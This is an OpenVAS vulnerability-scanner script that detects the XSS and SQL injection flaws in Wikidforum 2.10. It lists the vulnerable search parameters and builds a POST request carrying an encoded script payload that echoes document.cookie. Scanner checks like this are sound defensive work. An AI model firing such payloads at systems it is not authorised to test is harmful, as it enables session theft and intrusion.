###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wikidforum_mult_xss_n_sql_inj_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Wikidforum Multiple XSS and SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802710");
  script_version("$Revision: 13659 $");
  script_cve_id("CVE-2012-6520", "CVE-2012-2099");
  script_bugtraq_id(52425);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2012-03-16 13:30:44 +0530 (Fri, 16 Mar 2012)");
  script_name("Wikidforum Multiple XSS and SQL Injection Vulnerabilities");
  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2012/q2/75");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73985");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73980");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521934");
  script_xref(name:"URL", value:"http://www.darksecurity.de/advisories/2012/SSCHADV2012-005.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/110697/SSCHADV2012-005.txt");
  script_xref(name:"URL", value:"http://sec.jetlib.com/Bugtraq/2012/03/12/Wikidforum_2.10_Multiple_security_vulnerabilities");
  script_xref(name:"URL", value:"http://www.wikidforum.com/forum/forum-software_29/wikidforum-support_31/sschadv2012-005-unfixed-xss-and-sql-injection-security-vulnerabilities_188.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary
  web script or HTML in a user's browser session in the context of an affected
  site and manipulate SQL queries by injecting arbitrary SQL code.");
  script_tag(name:"affected", value:"Wikidforum version 2.10");
  script_tag(name:"insight", value:"The flaws are due to input validation errors in the 'search'
  field and 'Author', 'select_sort' and 'opt_search_select' parameters in
  'Advanced Search' field when processing user-supplied data.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Wikidforum and is prone to multiple
  cross-site scripting and SQL injection vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)){
  exit(0);
}

useragent = http_get_user_agent();
host = http_host_name(port:port);

foreach dir (make_list_unique("/", "/wiki", "/wikidforum", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/admin/login.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  if(rcvRes && ('"Wikid Forum' >< rcvRes || (">Wiki - Admin<" >< rcvRes &&
          "loginboxmain" >< rcvRes && "loginimgmain" >< rcvRes)))
  {
    postdata = "txtsearch=%27%22%3C%2Fscript%3E%3Cscript%3Ealert%28" +
                "document.cookie%29%3C%2Fscript%3E";
    req = string("POST ", dir, "/index.php?action=search&mode=search HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);
    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "HTTP/1\.. 200" && "><script>alert(document.cookie)</script>" >< res)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
